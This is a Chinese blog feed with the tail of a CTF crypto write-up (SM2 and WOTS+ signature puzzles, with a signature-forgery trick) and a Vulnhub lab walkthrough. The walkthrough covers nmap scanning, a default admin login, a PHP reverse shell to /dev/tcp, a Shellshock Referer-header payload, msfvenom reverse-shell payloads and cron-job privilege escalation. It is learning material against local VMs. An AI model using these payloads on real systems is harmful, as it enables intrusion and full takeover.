class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;g&quot;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;b&quot;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 证书</span></span><br><span class="line">    cert_hex = <span class="string">&#xx27;</span>  <span class="comment"># 证书16进制格式</span></span><br><span class="line">    <span class="comment"># 时间</span></span><br><span class="line">    time_stamp = <span class="string">&#x27;2025-05-20 10:10:00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># asn1封装</span></span><br><span class="line">    asn1_package_hex = asn1_package(version, oid, signature, curve_params, cert_hex, time_stamp)</span><br><span class="line">    <span class="keyword">return</span>(asn1_package_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 验签</span></span><br><span class="line">    data = <span class="string">b&quot;Hello, CryptoCup!&quot;</span></span><br><span class="line">    asn1_package_hex = generateSM2SignedDataExample()</span><br><span class="line">    sm2_config = SM2Config(asn1_package_hex)</span><br><span class="line">    result = sm2_config.verify(data)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="stringspan></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">待签名消息(字符串):</span></span><br><span class="line"><span class="string">TYTNGLNVKYDLVCGTUYUARFLEFKLAKAZO</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="初始谜题3"><a class="markdownIt-Anchor" href="#初始谜题3"></a> 初始谜题3</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_32byte_chunks</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 确保十六进制字符串长度是64的倍数（因为32字节 = 64个十六进制字符）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;十六进制字符串长度必须是64的倍数&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每64个字符分割一次，并转换为字节</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">bytes</span>.fromhex(hex_str[i:i + <span class="number">64</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openssl_sha256</span>(<span class="params">message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> sha256(message).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WOTSPLUS</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        w: <span class="built_in">int</span> = <span class="number">16</span>,  <span class="comment"># Winternitz 参数，控制空间与时间的复杂度</span></span></span><br><span class="line"><span class="params">        hashfunction: <span class="type">Callable</span> = openssl_sha256,  <span class="comment"># 哈希函数</span></span></span><br><span class="line"><span class="params">        digestsize: <span class="built_in">int</span> = <span class="number">256</span>,  <span class="comment"># 摘要大小，单位为比特</span></span></span><br><span class="line"><span class="params">        pubkey: <span class="type">List</span>[<span class="built_in">bytes</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.w = w</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">2</span> &lt;= w &lt;= (<span class="number">1</span> &lt;&lt; digestsize)):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;规则错误:2 &lt;= w &lt;= 2^digestsize&quot;</span>)</span><br><span class="line">        <span class="comment"># 消息摘要所需的密钥数量（默认8个）</span></span><br><span class="line">        self.msg_key_count = <span class="number">8</span></span><br><span class="line">        <span class="comment"># 校验和密钥数量</span></span><br><span class="line">        self.cs_key_count = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 总密钥数量 = 消息密钥 + 校验和密钥</span></span><br><span class="line">        self.key_count = self.msg_key_count + self.cs_key_count</span><br><span class="line">        self.hashfunction = hashfunction</span><br><span class="line">        self.digestsize = digestsize</span><br><span class="line">        self.pubkey = pubkey</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">number_to_base</span>(<span class="params">num: <span class="built_in">int</span>, base: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> [<span class="number">0</span>]  <span class="comment"># 如果数字是 0，直接返回 0</span></span><br><span class="line"></span><br><span class="line">        digits = []  <span class="comment"># 存储转换后的数字位</span></span><br><span class="line">        <span class="keyword">while</span> num:</span><br><span class="line">            digits.append(<span class="built_in">int</span>(num % base))  <span class="comment"># 获取当前数字在目标进制下的个位，并添加到结果列表</span></span><br><span class="line">            num //= base  <span class="comment"># 对数字进行整除，处理下一位</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> digits[::-<span class="number">1</span>]  <span class="comment"># 返回按顺序排列的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_chain</span>(<span class="params">self, value: <span class="built_in">bytes</span>, startidx: <span class="built_in">int</span>, endidx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startidx, endidx):</span><br><span class="line">            value = self.hashfunction(value)  <span class="comment"># 每次迭代对当前哈希值进行哈希操作</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_signature_base_message</span>(<span class="params">self, msghash: <span class="built_in">bytes</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="comment"># 将消息哈希从字节转换为整数</span></span><br><span class="line">        msgnum = <span class="built_in">int</span>.from_bytes(msghash, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将消息的数字表示转换为特定进制下的比特组表示</span></span><br><span class="line">        msg_to_sign = self.number_to_base(msgnum, self.w)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 校验消息比特组的数量是否符合预期</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(msg_to_sign) &gt; self.msg_key_count:</span><br><span class="line">            err = (</span><br><span class="line">                <span class="string">&quot;The fingerprint of the message could not be split into the&quot;</span></span><br><span class="line">                + <span class="string">&quot; expected amount of bitgroups. This is most likely &quot;</span></span><br><span class="line">                + <span class="string">&quot;because the digestsize specified does not match to the &quot;</span></span><br><span class="line">                + <span class="string">&quot; real digestsize of the specified hashfunction Excepted:&quot;</span></span><br><span class="line">                + <span class="string">&quot; &#123;&#125; bitgroups\nGot: &#123;&#125; bitgroups&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> IndexError(err.<span class="built_in">format</span>(self.msg_key_count, <span class="built_in">len</span>(msg_to_sign)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> msg_to_sign</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pubkey_from_signature</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self, digest: <span class="built_in">bytes</span>, signature: <span class="type">List</span>[<span class="built_in">bytes</span>]</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="type">List</span>[<span class="built_in">bytes</span>]:</span><br><span class="line">        msg_to_verify = self.get_signature_base_message(digest)</span><br><span class="line"></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg_to_verify):</span><br><span class="line">            sig_part = signature[idx]</span><br><span class="line">            chained_val = self._chain(sig_part, val, self.w - <span class="number">1</span>)</span><br><span class="line">            result.append(chained_val)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, digest: <span class="built_in">bytes</span>, signature: <span class="type">List</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        pubkey = self.get_pubkey_from_signature(digest, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pubkey == self.pubkey <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pubkey_hex = <span class="string">&quot;5057432973dc856a7a00272d83ea1c14de52b5eb3ba8b70b373db8204eb2f902450e38dbade5e9b8c2c3f8258edc4b7e8101e94ac86e4b3cba92ddf3d5de2a2b454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3abaae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114af4f0cf8f80e22c3975ba477dc4769c3ef67ffdf2090735d81d07bc2e6235af1ee41ef332215422d31208c2bc2163d6690bd32f4926b2858ca41c12eec88c0a300571901a3f674288e4a623220fb6b70e558d9819d2f23da6d897278f4056c346d7f729f5f70805ad4e5bd25cfa502c0625ac02185e014cf36db4ebcdb3ed1a38&quot;</span></span><br><span class="line">    pubkey_list_bytes = hex_to_32byte_chunks(pubkey_hex)</span><br><span class="line">    wots = WOTSPLUS(pubkey=pubkey_list_bytes)</span><br><span class="line">    digest_hex = <span class="string">&quot;84ffb82e&quot;</span></span><br><span class="line">    signature_hex = <span class="string">&quot;25d5a0e650d683506bfe9d2eca6a3a99b547a4b99398622f6666ce10131e971b6bd36841c9074fe9b4de2900ebe3fadb3202a173be486da6cf8f3d8c699c95c3454c067a995060d1664669b45974b15b3423cec342024fe9ccd4936670ec3abaae4f6b97279bd8eb26463a8cb3112e6dcbf6301e4142b9cdc4adfb644c7b114a4966398a789b56bdb09ea195925e7e8cde372305d244604c48db08f08a6e8a38951030deb25a7aaf1c07152a302ebc07d5d0893b5e9a5953f3b8500179d138b9aa90c0aaacea0c23d22a25a86c0b747c561b480175b548fcb1f4ad1153413bc74d9c049d43ffe18ceee31e5be8bdb9968103ef32fb4054a4a23c400bbfe0d89f&quot;</span></span><br><span class="line">    digest_bytes = <span class="built_in">bytes</span>.fromhex(digest_hex)</span><br><span class="line">    signature = hex_to_32byte_chunks(signature_hex)</span><br><span class="line">    valid = wots.verify(digest_bytes, signature)</span><br><span class="line">    <span class="built_in">print</span>(valid)</span><br></pre></td></tr></table></figure><p>十六进制的签名<code>signature_hex</code>经过<code>hex_to_32byte_chunks</code>被分成了八组<br /><strong>消息摘要</strong>的主要用途是计算这八组数据的<strong>sha256迭代次数</strong>，如果消息摘要是<code>8xxxx</code>，那么第一次迭代次数就是7次，因为<code>w-1=15</code> <code>[8:15)</code>步长为7<br />最后会将哈希迭代之后的八组数据进行拼接，从而生成<code>pubkey</code><br />通过<code>verify认证函数</code>判断提交的摘要和签名所生成的<code>pubkey</code>是否和环境生成的<code>pubkey</code>一样</p><p>所以，思路很明确，既然哈希反向解密很难，因为这里必须得经过迭代，那么如果我迭代次数为零呢？这样我的签名通过<code>get_pubkey_from_signature</code>就会得到环境的公钥，我们直接让摘要为<code>ffffffff</code>，签名为环境提供的公钥，就可以通过验证了</p><p><img src="https://pica.zhimg.com/80/v2-a41a5389e5d7b44b7ffd5fb5f733c5b8_1440w.png" alt="" /><br />还得是中科大，<strong>7分51秒</strong>拿下了一血，算上下载附件的时间，他们就做了5分钟<br />不过，这题确实不难，但他们代码审的好快啊O^O，我在那磨磨蹭蹭做了一个小时这样</p><h2 id="夺旗闯关"><a class="markdownIt-Anchor" href="#夺旗闯关"></a> 夺旗闯关*</h2><h3 id="gitea服务器"><a class="markdownIt-Anchor" href="#gitea服务器"></a> gitea服务器*</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># login.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> service</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/asn1&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/tjfoc/gmsm/sm2&quot;</span></span><br><span class="line"><span class="string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *LoginService)</span></span> Login(username, authInfo, certStr <span class="type">string</span>) (token <span class="type">string</span>, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// 读取用户证书</span></span><br><span class="line">cert, err := s.CertService.LoadCertificate(certStr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := s.CertService.ValidateCertificate(cert, RootCert); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 校验用户名</span></span><br><span class="line"><span class="keyword">if</span> cert.Subject.CommonName != username &#123;</span><br><span class="line">err = errors.New(<span class="string">&quot;username is not valid&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否挑战成功（随机字符串的签名能否用证书中的公钥验签过）</span></span><br><span class="line">ecdsaPubKey, ok := cert.PublicKey.(*ecdsa.PublicKey)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;public key in cert is not sm2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">sm2PubKey := sm2.PublicKey&#123;</span><br><span class="line">Curve: ecdsaPubKey.Curve,</span><br><span class="line">X:     ecdsaPubKey.X,</span><br><span class="line">Y:     ecdsaPubKey.Y,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 authInfo 中提取 randomStr 和 signature</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(authInfo) != <span class="number">256</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;鉴别信息格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">randomStr := authInfo[<span class="number">0</span>:<span class="number">128</span>]</span><br><span class="line">signature := authInfo[<span class="number">128</span>:]</span><br><span class="line"></span><br><span class="line">_, err = ValidateSignature(randomStr, signature, &amp;sm2PubKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s.generateToken(username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证签名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ValidateSignature</span><span class="params">(messageHex, signatureHex <span class="type">string</span>, publicKey *sm2.PublicKey)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">msg, err := hex.DecodeString(messageHex)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;挑战值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(signatureHex) != <span class="number">128</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r, ok := big.NewInt(<span class="number">0</span>).SetString(signatureHex[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">s, ok := big.NewInt(<span class="number">0</span>).SetString(signatureHex[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature, err := asn1.Marshal(<span class="keyword">struct</span>&#123; R, S *big.Int &#125;&#123;r, s&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isValid := publicKey.Verify(msg, signature)</span><br><span class="line"><span class="keyword">if</span> isValid &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, fmt.Errorf(<span class="string">&quot;签名无效&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下半场直接摆烂睡觉了，本来是准备刷一下<strong>渗透靶机</strong>的，发现<strong>解压密码</strong>在微信聊天记录里面。。。。。</p><p>断网啊，哥们，我玩牛魔……</p><p>玩！</p><p><img src="https://pic1.zhimg.com/80/v2-710631aedf0c58eeaa7b2a39dc32a476_1440w.jpeg" alt="" /><br /><img src="https://pica.zhimg.com/80/v2-5801c0b799379099e611b0c67ab82a82_1440w.jpeg" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-3d1106abce12b0a535eef9715fafc69d_1440w.jpeg" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-f54fc52f21112d13bf90e2711faa78d0_1440w.jpeg" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-d7b80113ecfd9a518e75b475c7bf7137_1440w.jpeg" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很好，属于是来&lt;strong&gt;重庆旅&lt;/strong&gt;游来了，先爆一下战绩，初始谜题做了一个，差点爆零(bushi)&lt;/p&gt;
&lt;p&gt;去年还能做两个初始谜题，后面的夺旗闯关还能有点思路，就是不会写而已&lt;/p&gt;
&lt;p&gt;今年的夺旗闯关就真不会了，看得懂一点，但具体不知道要干嘛，&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub打靶记录</title>
    <link href="https://hvang10.github.io/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
    <published>2025-06-05T17:39:43.000Z</published>
    <updated>2025-08-05T17:48:07.498Z</updated>
    
    <content type="html"><![CDATA[<p>此文诞生于本人实习期间，属于是<strong>摸鱼成果</strong>，虽然但是也没打几个靶场，毕竟哪有这么爽的鱼可以摸</p><p>只能说<code>vulnhub</code>这边的靶场比较偏向教育性质，适合新手，可能进阶的那些我还没接触()</p><p>在某次训练营中，被主办方设计的比较贴近实际的仿真靶场给虐到了，后续应该会投向与<strong>HTB</strong>等靶场平台继续学习了……</p><h1 id="nmap命令参数介绍"><a class="markdownIt-Anchor" href="#nmap命令参数介绍"></a> nmap命令参数介绍</h1><p>待补充</p><h1 id="sickos11"><a class="markdownIt-Anchor" href="#sickos11"></a> SickOS1.1</h1><p><code>网络适配器</code>设置成<code>NAT模式</code><br />这里靶机需要登陆<br /><img src="https://picx.zhimg.com/80/v2-21c08ac76a33163198a021514062757c_1440w.png" alt="" /></p><h2 id="主机发现和端口扫描"><a class="markdownIt-Anchor" href="#主机发现和端口扫描"></a> 主机发现和端口扫描</h2><p><code>ip a</code>获取<code>kali本机</code>的<code>ip</code>，然后扫描该网段的主机存活信息<br /><code>nmap -sn 192.168.32.0/24</code><br />靶机上线前后各扫一次就可以找到靶机<code>ip</code>了<br />最小速率<code>10000</code>扫描，<code>-p-</code>扫描<strong>全部端口</strong><br /><code>nmap --min-rate 10000 -p- 192.168.32.129</code><br /><img src="https://pic1.zhimg.com/80/v2-82d47efe9e72e894d16067edb8ac4171_1440w.png" alt="" /><br />发现22端口的<code>ssh服务</code>开放，3128端口的<code>squid-http服务</code>开放，8080端口的<code>http服务</code>关闭<br /><code>tcp</code>再扫一下这三个端口，<code>-sT</code>用TCP扫描，<code>-sV</code>查看服务版本，<code>-O</code>查看操作系统版本，<code>-p</code>后面添加端口号<br /><img src="https://pica.zhimg.com/80/v2-7f9f07fd0dc6498906a9cff77ca3508a_1440w.png" alt="" /></p><p><code>UDP</code>再扫一次，确保不会漏掉攻击面<br /><code>nmap -sU -p22,3128,8080 192.168.32.129</code><br /><img src="https://picx.zhimg.com/80/v2-8afcd761d67cfbf54242e06960b1a311_1440w.png" alt="" /><br />还是没有关键信息</p><p>再用<code>nmap</code>自带的漏洞扫描脚本扫一下<br /><code>nmap --script=vuln -p22,3128,8080 192.168.32.129</code><br />一样没有关键信息</p><p>目前得到的信息是，无法访问的8080的端口<code>web服务</code>，3128端口的<code>http代理服务</code>，22端口的<code>ssh服务</code>这边暂时不知道用户名密码也无法入手</p><p>也不知道<code>squid</code>是个什么玩意，访问对应端口，然后搜<code>squid/3.1.19</code>，只知道是一个比较老的开源代理服务器，还涉及到几个<code>CVE</code></p><h2 id="目录扫描"><a class="markdownIt-Anchor" href="#目录扫描"></a> 目录扫描</h2><p><code>dirb http://192.168.32.129 -p http://192.168.32.129:3128</code><br /><img src="https://picx.zhimg.com/80/v2-f4223785ce4f09a6f4ff5def3ad49535_1440w.png" alt="" /></p><h2 id="web渗透"><a class="markdownIt-Anchor" href="#web渗透"></a> web渗透</h2><p>同样需要设置代理才能访问靶机(可以直接搜<code>proxy</code>)<br /><img src="https://picx.zhimg.com/80/v2-01c5ab3134851be70aeac2b4f163fba9_1440w.png" alt="" /><br /><code>robots.txt</code>告诉我们可以访问一下<code>/wolfcms</code><br />这是一个<code>cms内容管理系统</code>，并且发现文章是<strong>管理员</strong>上传的，找一下<code>admin</code>登陆路径</p><p><code>/wolfcms/?/admin/login</code>，弱口令<code>admin/admin</code>进去了<br /><img src="https://picx.zhimg.com/80/v2-e2a9ffcf2bd7b28a66f28b3458da0627_1440w.png" alt="" /></p><h2 id="反弹shell提权"><a class="markdownIt-Anchor" href="#反弹shell提权"></a> 反弹shell提权</h2><p>发现很多<code>php</code>代码文件并且可以直接修改，直接塞一句<code>反弹shell</code>进去<code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1'&quot;); ?&gt;</code><br />然后保存访问一下，靶机就可以连上我们主机了<br /><code>kali</code>开监听<code>2333端口</code></p><p><img src="https://pic1.zhimg.com/80/v2-76a4d4e13c1081d3f78a86f48f9e161f_1440w.png" alt="" /><br />这里拿到的是<code>mysql</code>的账密，看一下<code>/etc/passwd</code><br />发现账户有<code>root sickos www-data</code>，并且<code>root sickos</code>都有<code>/bin/bash</code>的环境，<code>sickos</code>可能是一个高权限用户，尝试了<code>ssh</code>登陆</p><p>发现<code>sickos/john@123</code>可以登陆，知道密码我们可以直接提权<code>sudo su</code></p><h2 id="nikto扫描"><a class="markdownIt-Anchor" href="#nikto扫描"></a> nikto扫描</h2><p>思路二：</p><p>既然涉及到网页服务，也可以拿<code>nikto</code>扫一下<br /><code>nikto</code>是一个开源的网页服务器扫描器，坏处就是它不经常更新</p><p>这里还是要走一下代理<br /><code>nikto -h 192.168.32.129 -useproxy http://192.168.32.129:3128</code><br />发现在<code>/cgi-bin/status</code>目录下存在<code>ShellShock</code>漏洞<br /><img src="https://picx.zhimg.com/80/v2-e2f1b88e8ac8388804e26b0cf310850f_1440w.png" alt="" /><br /><code>Shellshock</code>，又称<code>Bashdoor</code>，是在<code>Unix</code>中广泛使用的<code>Bash shell</code>中的一个安全漏洞，首次于2014年9月24日公开。许多互联网守护进程，如网页服务器，使用<code>bash</code>来处理某些命令，从而允许攻击者在易受攻击的<code>Bash</code>版本上执行任意代码。这可使攻击者在未授权的情况下访问计算机系统</p><h2 id="shellshock漏洞利用"><a class="markdownIt-Anchor" href="#shellshock漏洞利用"></a> shellshock漏洞利用</h2><p>这里可以通过构造恶意的<code>Referer头</code>来执行任意命令</p><p><code>curl -v --proxy http://192.168.32.129:3128 http://192.168.32.129/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit&quot;</code><br />发现成功执行了</p><p>可以<code>反弹shell</code>看看有没有可利用的信息</p><p>生成<code>bash反弹shell</code>命令<br /><code>msfvenom -p cmd/unix/reverse_bash lhost=192.168.32.128 lport=2333 -f raw</code></p><p><code>curl -v --proxy http://192.168.32.129:3128 http://192.168.32.129/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;113-;exec 113&lt;&gt;/dev/tcp/192.168.32.128/2333;/bin/sh &lt;&amp;113 &gt;&amp;113 2&gt;&amp;113&quot;</code></p><p><code>kali</code>开监听<code>nc lvnp 2333</code></p><p>发现交互很难看，通过<code>包管理器</code>看看有没有<code>Python</code>之类方便的<code>交互shell</code><br /><code>dpkg -l</code></p><p><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code></p><p>查看网页的根目录<code>cd /var/www</code><br />查看权限<code>ls -al</code><br />发现<code>connect.py</code>居然给到了<code>777</code>，即<strong>所有用户</strong>都<strong>可读可写可执行</strong><br />这里可以根据内容猜测它存在<strong>定时任务</strong></p><h2 id="定时任务提权"><a class="markdownIt-Anchor" href="#定时任务提权"></a> 定时任务提权</h2><p><code>cd /etc</code><br /><code>ls -al | grep &quot;cron&quot;</code><br /><code>cd cron.d</code><br /><code>cat automate</code><br />发现它是以<code>root权限</code>每分钟执行<code>connect.py</code>这个文件，这样就可以通过写<code>Python的反弹shell命令</code>到<code>connect.py</code>这个文件，就可以成功<code>root</code>了</p><p><code>msfvenom -p cmd/unix/reverse_python lhost=192.168.32.128 lport=2333 -f raw</code></p><p>然后<code>kali</code>开监听，等一分钟左右即可</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p><strong>账密默认配置</strong>可能是个突破口，但现在的环境基本无法利用；<strong>定时任务</strong>也是一个很有用的<strong>提权</strong>思路</p><h1 id="w1r3s101"><a class="markdownIt-Anchor" href="#w1r3s101"></a> W1R3S1.01</h1><h2 id="主机发现和端口扫描-2"><a class="markdownIt-Anchor" href="#主机发现和端口扫描-2"></a> 主机发现和端口扫描</h2><p>是一个<code>ubuntu16</code>的靶机，同样需要密码登陆</p><p><code>nmap -sn 192.168.32.0/24</code><br />发现主机<code>192.168.32.130</code><br /><code>nmap --min-rate 10000 -p- 192.168.32.130</code><br />发现21端口<code>ftp文件传输服务</code>，22端口<code>ssh服务</code>，80端口<code>http服务</code>，3306端口<code>mysql服务</code><br /><img src="https://picx.zhimg.com/80/v2-51ee067e4460f2642cb867c77575205c_1440w.png" alt="" /><br />发现了<code>wordpress</code>登陆网页</p><p><code>ftp服务</code>没有什么可以利用的信息，可以通过<code>get</code>下载文件</p><p><code>wordpress</code>登陆页面的操作都是在跳转<code>localhost</code>，不能进行爆密码操作。。。</p><h2 id="目录扫描-2"><a class="markdownIt-Anchor" href="#目录扫描-2"></a> 